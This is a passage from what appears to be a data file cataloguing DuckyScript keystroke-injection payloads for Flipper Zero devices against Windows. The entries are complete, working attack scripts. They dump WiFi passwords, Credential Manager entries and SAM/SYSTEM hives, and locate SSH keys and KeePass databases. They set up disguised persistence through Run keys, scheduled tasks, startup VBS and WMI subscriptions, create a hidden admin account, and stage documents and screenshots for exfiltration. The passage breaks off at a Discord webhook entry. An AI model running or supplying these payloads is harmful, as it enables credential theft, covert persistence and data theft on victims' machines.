STRING $out = "$env:TEMP\\secpolicy.txt"; "=== PASSWORD POLICY ===" | Out-File $out; net accounts | Out-File $out -Append; "=== LOCAL SECURITY POLICY ===" | Out-File $out -Append; secedit /export /cfg "$env:TEMP\\secpol.cfg" /quiet 2>$null; if (Test-Path "$env:TEMP\\secpol.cfg") { Get-Content "$env:TEMP\\secpol.cfg" | Out-File $out -Append; Remove-Item "$env:TEMP\\secpol.cfg" }; "=== AUDIT POLICY ===" | Out-File $out -Append; auditpol /get /category:* | Out-File $out -Append; "=== LOCAL ADMINS ===" | Out-File $out -Append; net localgroup Administrators | Out-File $out -Append; "=== USER ACCOUNTS ===" | Out-File $out -Append; Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordRequired, PasswordLastSet | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-usb-history',
    name: 'USB Device History',
    category: 'recon',
    description: 'Enumerates all USB storage devices ever connected to the system from registry. Includes device name, serial number, first/last connect times.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM USB Device History
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\usb_history.txt"; "=== USB STORAGE DEVICES ===" | Out-File $out; Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\*' -ErrorAction SilentlyContinue | Select-Object FriendlyName, HardwareID, Mfg, Service, ContainerID | Format-List | Out-String -Width 200 | Out-File $out -Append; "=== USB DEVICE CLASSES ===" | Out-File $out -Append; Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\*\\*' -ErrorAction SilentlyContinue | Select-Object DeviceDesc, HardwareID, Mfg | Where-Object { $_.DeviceDesc } | Format-List | Out-String -Width 200 | Out-File $out -Append; "=== PORTABLE DEVICES ===" | Out-File $out -Append; Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows Portable Devices\\Devices\\*' -ErrorAction SilentlyContinue | Select-Object FriendlyName, PSChildName | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-browser-data',
    name: 'Browser Data Reconnaissance',
    category: 'recon',
    description: 'Discovers installed browsers, their versions, profile locations, extensions, and bookmark file paths. Does not extract actual credentials.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Browser Data Reconnaissance
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\browser_recon.txt"; "=== INSTALLED BROWSERS ===" | Out-File $out; @('chrome','msedge','firefox','brave','opera') | ForEach-Object { $b=$_; $p=Get-Command $b -ErrorAction SilentlyContinue; if($p){"$b : $($p.Source)"} } | Out-File $out -Append; "=== CHROME PROFILES ===" | Out-File $out -Append; $cp = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data"; if(Test-Path $cp){ Get-ChildItem $cp -Directory | Where-Object {$_.Name -match '^(Default|Profile)'} | ForEach-Object { $_.FullName; Get-ChildItem "$($_.FullName)\\Extensions" -Directory -ErrorAction SilentlyContinue | Select-Object Name } } | Out-File $out -Append; "=== FIREFOX PROFILES ===" | Out-File $out -Append; $fp = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"; if(Test-Path $fp){ Get-ChildItem $fp -Directory | Select-Object FullName } | Out-File $out -Append; "=== EDGE PROFILES ===" | Out-File $out -Append; $ep = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"; if(Test-Path $ep){ Get-ChildItem $ep -Directory | Where-Object {$_.Name -match '^(Default|Profile)'} | Select-Object FullName } | Out-File $out -Append; "=== BOOKMARK FILES ===" | Out-File $out -Append; @("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks","$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Bookmarks") | Where-Object { Test-Path $_ } | ForEach-Object { "Found: $_" } | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-startup-programs',
    name: 'Startup Programs Enumeration',
    category: 'recon',
    description: 'Enumerates all programs set to run at boot or login: registry Run keys (HKLM/HKCU), Startup folders, scheduled tasks at logon, and services set to auto-start.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Startup Programs Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\startup.txt"; "=== HKLM RUN ===" | Out-File $out; Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== HKCU RUN ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== HKLM RUNONCE ===" | Out-File $out -Append; Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== STARTUP FOLDERS ===" | Out-File $out -Append; Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -ErrorAction SilentlyContinue | Select-Object Name, FullName | Format-Table | Out-String | Out-File $out -Append; Get-ChildItem "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -ErrorAction SilentlyContinue | Select-Object Name, FullName | Format-Table | Out-String | Out-File $out -Append; "=== AUTO-START SERVICES ===" | Out-File $out -Append; Get-Service | Where-Object { $_.StartType -eq 'Automatic' } | Select-Object Name, DisplayName, Status | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },

  // ==================== CREDENTIALS — PROFESSIONAL PENTEST ====================
  {
    id: 'cred-wifi-dump',
    name: 'WiFi Password Extractor',
    category: 'credentials',
    description: 'Extracts all saved WiFi network profiles and their plaintext passwords using netsh. Formats as clean SSID:Password pairs.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM WiFi Password Extractor
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\wifi_creds.txt"; "=== WiFi Credentials ===" | Out-File $out; (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $pass = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\\s+:\\s+(.+)$"; if ($pass) { "$name : $($pass.Matches.Groups[1].Value.Trim())" } else { "$name : (no password)" } } | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-browser-locations',
    name: 'Browser Password Store Locator',
    category: 'credentials',
    description: 'Locates browser credential databases for Chrome, Firefox, Edge, Brave, and Opera. Maps Login Data, logins.json, and key storage files for offline extraction.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Browser Password Store Locator
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\browser_cred_paths.txt"; "=== BROWSER CREDENTIAL STORES ===" | Out-File $out; $paths = @{Chrome="$env:LOCALAPPDATA\\Google\\Chrome\\User Data";Edge="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data";Brave="$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data";Opera="$env:APPDATA\\Opera Software\\Opera Stable";Firefox="$env:APPDATA\\Mozilla\\Firefox\\Profiles"}; foreach($b in $paths.Keys){ [Environment]::NewLine + "=== $b ===" | Out-File $out -Append; $bp = $paths[$b]; if(Test-Path $bp){ "Base: $bp" | Out-File $out -Append; if($b -ne 'Firefox'){ Get-ChildItem $bp -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; $lsf = Join-Path $bp "Local State"; if(Test-Path $lsf){"Local State (encryption key): $lsf" | Out-File $out -Append} } else { Get-ChildItem $bp -Recurse -Filter "logins.json" -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; Get-ChildItem $bp -Recurse -Filter "key4.db" -ErrorAction SilentlyContinue | Select-Object FullName | Format-Table | Out-String | Out-File $out -Append } } else { "Not installed" | Out-File $out -Append } }; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-manager-dump',
    name: 'Windows Credential Manager Dump',
    category: 'credentials',
    description: 'Dumps Windows Credential Manager entries using cmdkey and vaultcmd. Lists stored credentials for websites, RDP, network shares, and generic credentials.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows Credential Manager Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\cred_manager.txt"; "=== CMDKEY STORED CREDENTIALS ===" | Out-File $out; cmdkey /list | Out-File $out -Append; "=== VAULT LIST ===" | Out-File $out -Append; vaultcmd /list | Out-File $out -Append; "=== VAULT DETAILS ===" | Out-File $out -Append; vaultcmd /listcreds:"Windows Credentials" /all 2>$null | Out-File $out -Append; vaultcmd /listcreds:"Web Credentials" /all 2>$null | Out-File $out -Append; "=== CREDENTIAL FILES ===" | Out-File $out -Append; $credPath = "$env:LOCALAPPDATA\\Microsoft\\Credentials"; if(Test-Path $credPath){ Get-ChildItem $credPath | Select-Object Name, Length, LastWriteTime | Format-Table | Out-String | Out-File $out -Append } else { "No credential files found" | Out-File $out -Append }; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-sam-backup',
    name: 'SAM/SYSTEM Hive Backup',
    category: 'credentials',
    description: 'Creates backup copies of SAM and SYSTEM registry hives for offline password hash extraction. Requires administrative privileges. Uses reg save command.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM SAM/SYSTEM Hive Backup - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $d=\\\"$env:TEMP\\\\hive_backup\\\"; New-Item -Path $d -ItemType Directory -Force | Out-Null; reg save HKLM\\SAM \\\"$d\\\\sam.bak\\\" /y 2>&1 | Out-File \\\"$d\\\\backup_log.txt\\\"; reg save HKLM\\SYSTEM \\\"$d\\\\system.bak\\\" /y 2>&1 | Out-File \\\"$d\\\\backup_log.txt\\\" -Append; reg save HKLM\\SECURITY \\\"$d\\\\security.bak\\\" /y 2>&1 | Out-File \\\"$d\\\\backup_log.txt\\\" -Append; \\\"Backup completed at $(Get-Date)\\\" | Out-File \\\"$d\\\\backup_log.txt\\\" -Append; explorer $d' -Verb RunAs"
ENTER`
  },
  {
    id: 'cred-ssh-discovery',
    name: 'SSH Key Discovery',
    category: 'credentials',
    description: 'Searches for SSH private keys, known_hosts, config files, and authorized_keys across user profiles. Lists key types, permissions, and associated hosts.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM SSH Key Discovery
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\ssh_keys.txt"; "=== SSH KEY DISCOVERY ===" | Out-File $out; Get-ChildItem "C:\\Users" -Directory | ForEach-Object { $ssh = Join-Path $_.FullName ".ssh"; if(Test-Path $ssh){ [Environment]::NewLine + "=== $($_.Name) ===" | Out-File $out -Append; Get-ChildItem $ssh -File | ForEach-Object { "File: $($_.Name) | Size: $($_.Length) | Modified: $($_.LastWriteTime)" | Out-File $out -Append; $first = Get-Content $_.FullName -TotalCount 1 -ErrorAction SilentlyContinue; if($first -match 'PRIVATE KEY'){ "  TYPE: PRIVATE KEY FOUND!" | Out-File $out -Append } elseif($_.Name -eq 'known_hosts'){ "  Known hosts: $((Get-Content $_.FullName -ErrorAction SilentlyContinue).Count) entries" | Out-File $out -Append } elseif($_.Name -eq 'config'){ "  SSH Config contents:" | Out-File $out -Append; Get-Content $_.FullName -ErrorAction SilentlyContinue | Out-File $out -Append } } } }; "=== PUTTY SESSIONS ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\*' -ErrorAction SilentlyContinue | Select-Object PSChildName, HostName, UserName, PortNumber | Format-Table | Out-String | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-rdp-harvest',
    name: 'RDP Credential Harvest',
    category: 'credentials',
    description: 'Discovers saved Remote Desktop connections, RDP history, stored credentials, and RDP certificate cache. Maps recent RDP targets from registry.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM RDP Credential Harvest
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\rdp_creds.txt"; "=== RDP CONNECTION HISTORY ===" | Out-File $out; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*' -ErrorAction SilentlyContinue | ForEach-Object { [PSCustomObject]@{Server=$_.PSChildName; UsernameHint=$_.UsernameHint} } | Format-Table | Out-String | Out-File $out -Append; "=== DEFAULT RDP SETTINGS ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== RDP FILES ===" | Out-File $out -Append; Get-ChildItem "$env:USERPROFILE" -Recurse -Filter "*.rdp" -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; "=== STORED RDP CREDS ===" | Out-File $out -Append; cmdkey /list | Select-String "TERMSRV" | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-outlook-data',
    name: 'Outlook Profile & Data Finder',
    category: 'credentials',
    description: 'Locates Outlook OST/PST data files, profile configurations, and cached credentials. Maps all Outlook data stores without extracting email content.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Outlook Profile & Data Finder
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\outlook_data.txt"; "=== OUTLOOK PROFILES ===" | Out-File $out; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Office\\*\\Outlook\\Profiles\\*\\*' -ErrorAction SilentlyContinue | Where-Object { $_.'Account Name' } | Select-Object 'Account Name', 'Display Name', 'Email' | Format-List | Out-String | Out-File $out -Append; "=== OST FILES ===" | Out-File $out -Append; Get-ChildItem "$env:LOCALAPPDATA\\Microsoft\\Outlook" -Filter "*.ost" -ErrorAction SilentlyContinue | Select-Object Name, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; "=== PST FILES ===" | Out-File $out -Append; Get-ChildItem "C:\\Users" -Recurse -Filter "*.pst" -ErrorAction SilentlyContinue -Depth 5 | Select-Object FullName, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; "=== AUTOCOMPLETE (NK2/DAT) ===" | Out-File $out -Append; Get-ChildItem "$env:LOCALAPPDATA\\Microsoft\\Outlook\\RoamCache" -ErrorAction SilentlyContinue | Select-Object Name, Length | Format-Table | Out-String | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-keepass-finder',
    name: 'KeePass Database Finder',
    category: 'credentials',
    description: 'Searches the entire system for KeePass database files (.kdbx, .kdb), KeePass configuration files, and recently opened database paths from KeePass config.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM KeePass Database Finder
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\keepass_scan.txt"; "=== KEEPASS DATABASE FILES ===" | Out-File $out; Get-ChildItem "C:\\Users" -Recurse -Include "*.kdbx","*.kdb" -ErrorAction SilentlyContinue -Depth 6 | Select-Object FullName, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime, LastAccessTime | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== KEEPASS INSTALLATION ===" | Out-File $out -Append; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName -match 'KeePass' } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-List | Out-String | Out-File $out -Append; "=== KEEPASS CONFIG (Recent DBs) ===" | Out-File $out -Append; $kpConfig = "$env:APPDATA\\KeePass\\KeePass.config.xml"; if(Test-Path $kpConfig){ Select-String 'ConnectionInfo|Path|Database' $kpConfig | Out-File $out -Append } else { "No KeePass config found at default location" | Out-File $out -Append }; "=== OTHER PASSWORD MANAGERS ===" | Out-File $out -Append; @('1Password','Bitwarden','LastPass','Dashlane','Enpass') | ForEach-Object { $pm=$_; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -match $pm } | ForEach-Object { "$pm FOUND: $($_.DisplayName) v$($_.DisplayVersion)" | Out-File $out -Append } }; Invoke-Item $out
ENTER`
  },

  // ==================== PERSISTENCE — PROFESSIONAL PENTEST ====================
  {
    id: 'persist-reg-run',
    name: 'Registry Run Key Persistence',
    category: 'persistence',
    description: 'Adds a persistence entry to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run that executes a payload at every user login. Uses a benign-looking registry name.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Registry Run Key Persistence
REM Adds HKCU Run entry - survives reboots, no admin needed
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $name = 'WindowsSecurityHealthService'; $payload = 'powershell.exe -WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64_PAYLOAD'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $name -Value $payload -Force; if(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $name -ErrorAction SilentlyContinue){ "SUCCESS: Persistence set as $name" } else { "FAILED: Could not write registry" }
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'persist-schtask',
    name: 'Scheduled Task Persistence',
    category: 'persistence',
    description: 'Creates a scheduled task that runs a payload at user logon. Uses a Windows-like task name for stealth. Task survives reboots and runs in user context.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Scheduled Task Persistence
REM Creates logon-triggered scheduled task
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $taskName = 'MicrosoftEdgeUpdateTaskCore'; $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64_PAYLOAD'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description 'Microsoft Edge component update' -Force | Out-Null; if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){ "SUCCESS: Task '$taskName' created" } else { "FAILED" }
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'persist-startup-folder',
    name: 'Startup Folder Payload Drop',
    category: 'persistence',
    description: 'Creates a VBS wrapper script in the user Startup folder that executes a hidden PowerShell payload at each login. Simple but effective persistence.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Startup Folder Payload Drop
REM Drops VBS launcher in user Startup folder
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $startup = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; $vbs = Join-Path $startup 'SecurityHealth.vbs'; $content = 'Set objShell = CreateObject("WScript.Shell")' + [Environment]::NewLine + 'objShell.Run "powershell.exe -WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64_PAYLOAD", 0, False'; [IO.File]::WriteAllText($vbs, $content); if(Test-Path $vbs){ "SUCCESS: Dropped $vbs" } else { "FAILED" }
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'persist-wmi-event',
    name: 'WMI Event Subscription Persistence',
    category: 'persistence',
    description: 'Creates a permanent WMI event subscription for fileless persistence. Triggers on system uptime exceeding 120 seconds after boot. Requires admin.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM WMI Event Subscription Persistence - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $filterName=\\\"WinSecHealthFilter\\\"; $consumerName=\\\"WinSecHealthConsumer\\\"; $query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\\\\\\"Win32_PerfFormattedData_PerfOS_System\\\\\\\" AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180\\\"; $filter=Set-WmiInstance -Namespace root\\\\subscription -Class __EventFilter -Arguments @{Name=$filterName;EventNamespace=\\\"root\\\\cimv2\\\";QueryLanguage=\\\"WQL\\\";Query=$query}; $consumer=Set-WmiInstance -Namespace root\\\\subscription -Class CommandLineEventConsumer -Arguments @{Name=$consumerName;CommandLineTemplate=\\\"powershell.exe -WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64\\\"}; Set-WmiInstance -Namespace root\\\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer} | Out-Null; \\\"WMI persistence installed\\\" | Out-File $env:TEMP\\\\wmi_persist.log' -Verb RunAs"
ENTER`
  },
  {
    id: 'persist-hidden-admin',
    name: 'Hidden Local Admin Account',
    category: 'persistence',
    description: 'Creates a hidden local admin account with a dollar sign suffix (appears as machine account). Adds to Administrators group and hides from login screen via registry.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Hidden Admin Account - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $user=\\\"svc_update$\\\"; $pass=\\\"P@ssw0rd!2024\\\"; net user $user $pass /add /y 2>&1 | Out-File $env:TEMP\\\\admin_create.log; net localgroup Administrators $user /add 2>&1 | Out-File $env:TEMP\\\\admin_create.log -Append; reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\\" /v $user /t REG_DWORD /d 0 /f 2>&1 | Out-File $env:TEMP\\\\admin_create.log -Append; \\\"Account created: $user\\\" | Out-File $env:TEMP\\\\admin_create.log -Append' -Verb RunAs"
ENTER`
  },
  {
    id: 'persist-dll-hijack',
    name: 'DLL Search Order Hijack Setup',
    category: 'persistence',
    description: 'Identifies writable directories in the system PATH for DLL search order hijacking. Generates a template DLL drop location analysis for planting proxy DLLs.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM DLL Search Order Hijack Analysis
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\dll_hijack.txt"; "=== DLL HIJACK OPPORTUNITIES ===" | Out-File $out; "=== WRITABLE PATH DIRECTORIES ===" | Out-File $out -Append; $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) } | ForEach-Object { $p = $_; $writable = try { $t = Join-Path $p ([IO.Path]::GetRandomFileName()); [IO.File]::Create($t).Close(); Remove-Item $t; $true } catch { $false }; [PSCustomObject]@{Path=$p; Writable=$writable; FileCount=(Get-ChildItem $p -Filter '*.dll' -ErrorAction SilentlyContinue).Count} } | Where-Object { $_.Writable } | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== COMMON HIJACKABLE DLLs ===" | Out-File $out -Append; @('version.dll','userenv.dll','dbghelp.dll','wer.dll','amsi.dll','profapi.dll') | ForEach-Object { $dll=$_; "Checking $dll..."; $found = Get-ChildItem -Path ($env:PATH -split ';') -Filter $dll -ErrorAction SilentlyContinue | Select-Object FullName; if($found){ "$dll found: $($found.FullName)" } else { "$dll NOT in PATH dirs - hijackable" } } | Out-File $out -Append; Invoke-Item $out
ENTER`
  },

  // ==================== EXFILTRATION — PROFESSIONAL PENTEST ====================
  {
    id: 'exfil-doc-grabber',
    name: 'Document Grabber',
    category: 'exfiltration',
    description: 'Copies recent documents (.docx, .pdf, .xlsx, .pptx, .txt) from Desktop, Documents, and Downloads to a staging directory. Filters by last modified within 30 days.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Document Grabber - Recent Files
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $stage = "$env:TEMP\\doc_stage"; New-Item $stage -ItemType Directory -Force | Out-Null; $log = "$stage\\_manifest.txt"; $exts = @('*.docx','*.doc','*.pdf','*.xlsx','*.xls','*.pptx','*.csv','*.txt'); $dirs = @("$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads"); $count = 0; foreach($dir in $dirs){ if(Test-Path $dir){ foreach($ext in $exts){ Get-ChildItem $dir -Filter $ext -Recurse -ErrorAction SilentlyContinue -Depth 3 | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 10MB } | ForEach-Object { Copy-Item $_.FullName $stage -Force; "$($_.FullName) | $([math]::Round($_.Length/1KB))KB | $($_.LastWriteTime)" | Out-File $log -Append; $count++ } } } }; "Total files staged: $count" | Out-File $log -Append; explorer $stage
ENTER`
  },
  {
    id: 'exfil-screenshot-b64',
    name: 'Screenshot Capture & Base64',
    category: 'exfiltration',
    description: 'Takes a screenshot of all displays, saves as PNG, and optionally base64 encodes it for exfiltration via text channels. Includes POST template for webhook upload.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Screenshot Capture & Base64 Encode
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screens = [System.Windows.Forms.Screen]::AllScreens; $bounds = [System.Drawing.Rectangle]::Empty; foreach($s in $screens){ $bounds = [System.Drawing.Rectangle]::Union($bounds, $s.Bounds) }; $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $path = "$env:TEMP\\screen_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png); $gfx.Dispose(); $bmp.Dispose(); $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path)); $b64 | Out-File "$path.b64.txt"; "Screenshot: $path"; "Base64: $path.b64.txt"; "Size: $([math]::Round((Get-Item $path).Length/1KB))KB"
ENTER`
  },
  {
    id: 'exfil-discord-webhook',
    name: 'Discord Webhook Exfiltration',
    category: 'exfiltration',
    description: 'Collects system info, network config, and running processes then sends the data to a Discord webhook as a formatted embed. Replace WEBHOOK_URL with your endpoint.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
